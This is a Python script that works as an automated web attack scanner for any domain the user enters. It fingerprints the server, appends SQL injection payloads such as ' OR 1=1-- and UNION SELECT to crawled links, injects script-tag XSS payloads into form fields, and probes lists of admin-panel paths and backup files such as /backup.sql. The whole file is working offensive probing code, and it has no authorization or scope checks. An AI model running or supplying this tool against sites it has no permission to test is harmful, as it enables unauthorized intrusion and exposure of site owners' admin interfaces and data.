import socket
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode


# SQL injection error keywords
ERROR_KEYWORDS = [
    'DB Error', 'SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array',
    'mysql_num_rows', 'is_writable', 'mysql_Vulns', 'pg_exec',
    'mysql_query', 'pg_query', 'System Error', 'io_error',
    'privilege_not_granted', 'getimagesize', 'preg_match',
    'mysqli_Vulns', 'mysqli'
]

SQL_PAYLOADS = ["'", '"', " OR 1=1--", "' OR '1'='1", "' UNION SELECT 1,2,3--"]
XSS_HEADERS = ["Referer", "User-Agent"]
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>", "<iframe src='javascript:alert(\"XSS\")'>"
]
ADMIN_PANELS = [
    "/admin/", "/admin/login", "/admin/index.php", "/admin/dashboard",
    "/administrator/", "/admin_area/", "/controlpanel/", "/cpanel/",
    "/panel/", "/user/", "/manage/", "/yonetim/", "/yonetici/",
    "/backoffice/", "/webadmin/", "/admin.php", "/login.php"
]

def get_domain_info(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        print(f"[+] IP Address: {ip_address}")
        
        for protocol in ["http", "https"]:
            try:
                response = requests.get(f"{protocol}://{domain}", timeout=5)
                server_info = response.headers.get('Server', 'Unknown')
                print(f"[+] {protocol.upper()} Server: {server_info}")
            except requests.RequestException:
                print(f"[-] {protocol.upper()} request failed.")
    except socket.gaierror:
        print("[-] Could not resolve domain.")

def test_sql_injection(url):
    try:
        for payload in SQL_PAYLOADS:
            test_url = f"{url}{payload}"
            response = requests.get(test_url, timeout=5)
            if any(keyword in response.text for keyword in ERROR_KEYWORDS) or response.status_code == 500:
                print(f"[+] SQL Injection Vulnerability Found: {test_url}")
                return
            else:
                print(f"[-] No Vulnerability: {test_url}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request Failed for {url}: {e}")

def find_sql_vulnerable_links(base_url):
    try:
        response = requests.get(base_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for link in soup.find_all('a', href=True):
            url = urljoin(base_url, link['href'])
            if 'id=' in url or '=' in url:
                print(f"[*] Possible SQL URL Found: {url}")
                test_sql_injection(url)
    except requests.exceptions.RequestException as e:
        print(f"[-] Request Failed for {base_url}: {e}")

def simple_xss_scanner(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            print("[-] No forms found on the page.")
            return
        
        for form in forms:
            action = urljoin(url, form.get('action', ''))
            method = form.get('method', 'get').lower()
            
            for payload in XSS_PAYLOADS:
                data = {}
                for input_tag in form.find_all('input', {'type': ['text', 'search']}):
                    input_name = input_tag.get('name')
                    if input_name:
                        data[input_name] = payload
                        break
                
                if data:
                    response = requests.post(action, data=data) if method == 'post' else requests.get(action, params=data)
                    if payload in response.text:
                        print(f"[+] XSS found at: {action} with payload: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request Failed for {url}: {e}")

def scan_admin_panels(domain):
    for panel in ADMIN_PANELS:
        url = f"http://{domain}{panel}"
        try:
            response = requests.get(url, timeout=5, allow_redirects=True)
            if response.status_code == 200 or "Index of /" in response.text:
                print(f"[+] Found admin panel: {url}")
            elif response.history:
                print(f"[!] Possible redirected admin panel: {url} â†’ {response.url}")
        except requests.RequestException as e:
            print(f"[-] Request failed for {url}: {e}")

def check_backup_directories(domain):
    backup_dirs = ["/backup/", "/backups/", "/backup.zip", "/backup.sql"]
    for backup in backup_dirs:
        url = f"http://{domain}{backup}"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"[+] Found backup: {url}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed for {url}: {e}")

def main():
    domain = input("Enter domain to scan: ")
    print("\n--- Domain Information ---")
    get_domain_info(domain)
    print("\n--- SQL Injection Links ---")
    find_sql_vulnerable_links(f"http://{domain}")
    print("\n--- XSS Scanning ---")
    simple_xss_scanner(f"http://{domain}")
    print("\n--- Admin Panel Scan ---")
    scan_admin_panels(domain)
    print("\n--- Backup Directory Check ---")
    check_backup_directories(domain)

if __name__ == "__main__":
    main()
